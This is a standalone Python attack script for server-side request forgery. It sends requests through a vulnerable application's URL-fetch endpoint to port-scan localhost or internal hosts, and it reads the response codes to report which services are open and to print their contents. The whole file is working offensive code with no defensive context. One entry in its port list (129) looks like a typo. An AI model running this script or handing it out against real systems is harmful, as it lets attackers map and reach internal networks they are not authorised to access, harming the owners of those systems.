import requests

# IP addr of internal server (SSRF)
target_ip = '127.0.0.1'  # or an internal IP

# List of ports to scan
ports_to_scan = [80, 21, 22, 25, 129, 445, 443, 8080, 5000, 3306]  # Common ports

# Base URL of the vulnerable application
vulnerable_url = 'http://any-app-vulnerable.com/api/fetch'

for port in ports_to_scan:
    # Construct the payload to make the SSRF request
    payload = {'url': f'http://{target_ip}:{port}'}
    
    try:
        # Send the request
        response = requests.post(vulnerable_url, data=payload)
        
        # Check the response code
        if response.status_code == 200:
            print(f"Port {port} is open: {response.text}")
        elif response.status_code == 403:
            print(f"Port {port} is restricted: Access forbidden.")
        elif response.status_code == 404:
            print(f"Port {port} is closed: Not found.")
        else:
            print(f"Port {port}: Unexpected response code {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"Error connecting to port {port}: {e}")
